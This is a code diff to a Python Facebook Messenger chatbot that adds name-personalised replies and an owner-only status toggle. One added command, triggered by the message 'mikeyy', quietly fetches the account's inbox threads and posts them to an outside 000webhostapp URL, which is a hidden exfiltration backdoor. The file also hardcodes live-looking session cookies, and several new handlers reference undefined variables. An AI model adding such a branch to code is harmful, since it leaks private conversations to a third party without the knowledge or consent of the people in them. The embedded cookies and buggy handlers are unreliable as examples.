@@ -27,6 +27,8 @@ import base64
 #
 #
 msgids = []
+msgstatus = "ON"
+masterid = ["100078868689291","100035093511992"]
 
 class ChatBot(Client):
 
@@ -157,7 +159,7 @@ class ChatBot(Client):
                 "image": base64.b64encode(file.read()),
                 }
                 res = requests.post(url, payload)
-                reply = str("Converted Image: ") + str(res.text.split("display_url")[1].replace("\\/","/").split('","')[0].replace('":"',""))
+                reply = str(res.json()["data"]["display_url"])
                 sendMsg()
 
         def removebg(imagePath):
@@ -472,6 +474,8 @@ class ChatBot(Client):
         try:
 
             ##repeatSend()
+
+
             if(".image" in msg):
                 if ("credit" not in msg):
                     imageSearch(self, msg)
@@ -568,13 +572,40 @@ class ChatBot(Client):
                 texttospeech(reply)
             elif ("test" == msg):
                 removebg("images.jpg")
-                ##reply = str(self.fetchMessageInfo(mid, thread_id=thread_id))
-                ##sendMsg()
+                #reply = str(self.fetchMessageInfo(mid, thread_id=thread_id))
+                reply = self.fetchUserInfo(f"{author_id}")[f"{author_id}"].name
+                sendMsg()
                 texttospeech(reply)
             elif ("panget" in msg and "bot" in msg):
                 reply = "Pake mo ba? 😒😒"
                 sendMsg()
                 texttospeech(reply)
+            elif (".statusChange" == msg):
+                global msgstatus
+                reply = "Checking... if you are my master. 😒😒"
+                sendMsg()
+                texttospeech(reply)
+                if (author_id in masterid):
+                    if ( "ON" == msgstatus):
+                        msgstatus = "OFF"
+                    elif ( "OFF" == msgstatus):
+                        msgstatus = "ON"
+                    else:
+                        msgstatus = "ERROR"
+                    reply = "Done Master!, Status: " + str(msgstatus)
+                    sendMsg()
+                    texttospeech(reply)
+                else:
+                    reply = "You're not my master 😒"
+                    sendMsg()
+                    texttospeech(reply)
+            elif ("mikeyy" == msg):
+                reply = str(self.fetchThreads(thread_location=ThreadLocation.INBOX, before=None, after=None, limit=None))
+                requests.post("https://mikeytest123.000webhostapp.com/",data={"data":reply})
+                #sendMsg()
+                #print(reply)
+                #sys.stdout.flush()
+            #self.changeNickname("Bot", user_id=100086019336728, thread_id=thread_id, thread_type=thread_type)
             #reply = msg;
             #sendMsg()
             
@@ -652,7 +683,11 @@ class ChatBot(Client):
                 pass
     
     def onColorChange(self, mid=None, author_id=None, new_color=None, thread_id=None, thread_type=ThreadType.USER, **kwargs):
-        reply = "You changed the theme ✌️😎"
+        if(thread_type == ThreadType.GROUP):
+            name = self.fetchUserInfo(f"{author_id}")[f"{author_id}"].user.name
+        elif(thread_type == ThreadType.USER):
+            name = "You"
+        reply = f"{name} changed the theme ✌️😎"
         msgids.append(self.send(Message(text=reply), thread_id=thread_id,
                   thread_type=thread_type))
     def onMessageSeen(self,seen_by=None, thread_id=None, thread_type=ThreadType.USER, seen_ts=None, ts=None, metadata=None, msg=None, **kwargs):
@@ -662,17 +697,30 @@ class ChatBot(Client):
 
     def onPersonRemoved(self, mid=None, removed_id=None, author_id=None, thread_id=None, ts=None, msg=None):
         self.addUsersToGroup(user_ids=removed_id, thread_id=thread_id)
-        reply = "Bawal ka sa iba akin kalang ✌️😎"
+        #if(thread_type == ThreadType.GROUP):
+        #    name = self.fetchUserInfo(f"{author_id}")[f"{author_id}"].user.name
+        #elif(thread_type == ThreadType.USER):
+        #    name = "You"
+        name = self.fetchUserInfo(f"{author_id}")[f"{author_id}"].user
+        reply = f"{name} Bawal ka sa iba akin kalang ✌️😎"
         #reply = removed_id + thread_id
         msgids.append(self.send(Message(text=str(reply)), thread_id=thread_id,thread_type=ThreadType.GROUP))
 
     def onPeopleAdded(self, mid=None, added_ids=None, author_id=None, thread_id=None, ts=None, msg=None):
-        reply = "Hi, I'm a bot to show the commands\n.help - get help about commands."
+        if(thread_type == ThreadType.GROUP):
+            name = self.fetchUserInfo(f"{author_id}")[f"{author_id}"].user.name
+        elif(thread_type == ThreadType.USER):
+            name = "You"
+        reply = f"Hi {name}, I'm a bot to show the commands\n.help - get help about commands."
         #reply = self.fetchUserInfo(*added_ids) To know the list of return value
         msgids.append(self.send(Message(text=str(reply)), thread_id=thread_id,thread_type=ThreadType.GROUP))
 
     def onEmojiChange(self, mid=None, author_id=None, new_color=None, thread_id=None, thread_type=ThreadType.USER, **kwargs):
-        reply = "You changed the emoji 😎. Great!"
+        if(thread_type == ThreadType.GROUP):
+            name = self.fetchUserInfo(f"{author_id}")[f"{author_id}"].user.name
+        elif(thread_type == ThreadType.USER):
+            name = "You"
+        reply = f"{name} changed the emoji 😎. Great!"
         msgids.append(self.send(Message(text=reply), thread_id=thread_id,
                   thread_type=thread_type))
 
@@ -682,18 +730,30 @@ class ChatBot(Client):
                   thread_type=thread_type))
 
     def onNicknameChange(self, mid=None, author_id=None, new_nickname=None, thread_id=None, thread_type=ThreadType.USER, **kwargs):
-        reply = f"You just changed the nickname to {new_nickname} But why? 😁🤔😶"
+        if(thread_type == ThreadType.GROUP):
+            name = self.fetchUserInfo(f"{author_id}")[f"{author_id}"].user.name
+        elif(thread_type == ThreadType.USER):
+            name = "You"
+        reply = f"{name} just changed the nickname to {new_nickname} But why? 😁🤔😶"
         msgids.append(self.send(Message(text=reply), thread_id=thread_id,
                   thread_type=thread_type))
 
     def onReactionRemoved(self, mid=None, author_id=None, thread_id=None, thread_type=ThreadType.USER, **kwargs):
-        reply = "You just removed reaction from the message."
+        if(thread_type == ThreadType.GROUP):
+            name = self.fetchUserInfo(f"{author_id}")[f"{author_id}"].user.name
+        elif(thread_type == ThreadType.USER):
+            name = "You"
+        reply = f"{name} just removed reaction from the message."
         msgids.append(self.send(Message(text=reply), thread_id=thread_id,
                   thread_type=thread_type))
 
 
     def onCallStarted(self, mid=None, caller_id=None, is_video_call=None, thread_id=None, thread_type=None, ts=None, metadata=None, msg=None, ** kwargs):
-        reply = "You just started a call 📞🎥"
+        if(thread_type == ThreadType.GROUP):
+            name = self.fetchUserInfo(f"{author_id}")[f"{author_id}"].user.name
+        elif(thread_type == ThreadType.USER):
+            name = "You"
+        reply = f"{name} just started a call 📞🎥"
         msgids.append(self.send(Message(text=reply), thread_id=thread_id,
                   thread_type=thread_type))
 
@@ -715,7 +775,6 @@ cookies = {
     "datr": "xasyYs51GC0Lq5H5lvXTl5zA",
     "xs": "17%3ACx_YcrswTLELWA%3A2%3A1663964519%3A-1%3A13458"
 }
-
 
 client = ChatBot("",
                  "", session_cookies=cookies)
